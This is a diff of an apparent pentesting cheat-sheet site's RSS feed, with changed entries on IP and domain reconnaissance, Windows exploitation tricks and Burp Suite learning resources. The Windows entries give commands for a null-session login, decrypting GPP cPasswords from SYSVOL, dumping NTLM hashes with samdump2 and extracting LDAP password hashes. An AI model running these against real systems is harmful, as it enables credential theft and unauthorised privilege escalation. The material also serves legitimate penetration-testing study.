@@ -47,7 +47,7 @@ Symbolic link attack # base program int main(void) { system(&amp;#34;ls /path/to
       
       <guid>/open-source-intelligence-osint/technical-recon/domain_ip/</guid>
       <description>Identification Get information on an IP whois &amp;lt;IP&amp;gt; # Enhanced Whois https://domainbigdata.com https://whois.domaintools.com https://www.ip2location.com # Get IP address associated to a domain nslookup domain.fr ping domain.fr # Bing dorks to identify host sharing ip:xxx.xxx.xxx.xxx 
-Online Passive Identification Tools # Many passive tests can be done http://www.ipvoid.com/ # Informations about the target https://securitytrails.com/ # When you have a name or a e-mail adress you can perform a reverse whois lookup to find domain # names oned by a person of a company https://viewdns.</description>
+Online Passive Identification Tools # You can identify IP block owned by a company ipv4info.com # Then you can find domains and subdomains associated to an IP by using Passive Reverse DNS https://www.virustotal.com/gui/home/search RiskIQ Passive DNS # Many passive tests can be done http://www.</description>
     </item>
     
     <item>
@@ -65,8 +65,8 @@ Online Passive Identification Tools # Many passive tests can be done http://www.
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/exploitation/exploitation_tricks/</guid>
-      <description>From non-auth user to local admin in 3 steps # Nullsession net use \\dc\ipc$ &amp;#34;&amp;#34; /u:&amp;#34;&amp;#34; # Search for cpasswords in gpo&amp;#39;s: dir \\dc\sysvol\contoso.corp\Policies -r -I *.xml | Select-String cPassword &amp;gt;&amp;gt; dump.txt # Decrypt the cPassword gpp-decrypt &amp;lt;string&amp;gt; 
-Getting and cracking LDPA user hash # STEP 1: Dump target user hash: ldapsearch –x –h &amp;lt;LDAP_IPAddr&amp;gt; -D &amp;#34;cn=Directory Manager&amp;#34; -w &amp;lt;password&amp;gt; -b &amp;#39;uid=&amp;lt;target_username&amp;gt;,cn=users,cn=accounts,dc=&amp;lt;DOMAIN&amp;gt;,dc=COM&amp;#39; uid userpassword krbprincipalkey sambalmpassword sambantpassword # STEP 2: The ‘userpassword::’ and ‘krbprincipalkey::’ hash is base64 encoded and now you need to decode it: echo &amp;#39;e1NTSEF9dHZEaUZ4ejJTUkRBLzh1NUZSSGVIT2N4WkZMci9OYktQNHNLNWc9PQ==&amp;#39; | base64 --decode {SSHA}tvDiFxz2SRDA/8u5FRHeHOcxZFLr/NbKP4sK5g== # STEP 3: Place your decoded hash into hash.</description>
+      <description>Extracting NTLM hashes from SAM database # samdump2 allows you to extract NTLM hashes from the SAM database # You need to have SAM and SYSTEM files locally samdump2 SYSTEM SAM &amp;gt; hashes.txt 
+From non-auth user to local admin in 3 steps # Nullsession net use \\dc\ipc$ &amp;#34;&amp;#34; /u:&amp;#34;&amp;#34; # Search for cpasswords in gpo&amp;#39;s: dir \\dc\sysvol\contoso.corp\Policies -r -I *.xml | Select-String cPassword &amp;gt;&amp;gt; dump.txt # Decrypt the cPassword gpp-decrypt &amp;lt;string&amp;gt;</description>
     </item>
     
     <item>
@@ -1118,7 +1118,9 @@ Modules &amp;amp; Tools • Censys: uses censys.io to collect a large amount of 
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/web-attacks/burpsuite/</guid>
-      <description>TODO</description>
+      <description>WORK IN PROGRESS 
+Modules / Addons TODO 
+Resources to check # Complete MOOC style course (subscribing but it&amp;#39;s free) (2 links are the same course) https://www.udemy.com/burp-suite/ https://hackademy.aetherlab.net/p/burp-suite # Video course https://www.tutorialspoint.com/burpsuite/index.asp # Kinda detailed tutorial (text + pictures) https://www.pentestgeek.com/web-applications/burp-suite-tutorial-1 https://www.pentestgeek.com/web-applications/how-to-use-burp-suite # Fast course/tutorial (text + images) https://linuxconfig.org/learn-burp-suite-on-kali-linux-part-2 https://linuxconfig.org/learn-burp-suite-on-kali-linux-part-3 https://linuxconfig.org/learn-burp-suite-on-kali-linux-part-4 # ??? https://portswigger.net/web-security # Conferences slides https://fr.slideshare.net/ZackMeyers/web-hacking-with-burp-suite-101 # Not free (but it seems to have a kind of 10 days free ?</description>
     </item>
     
     <item>
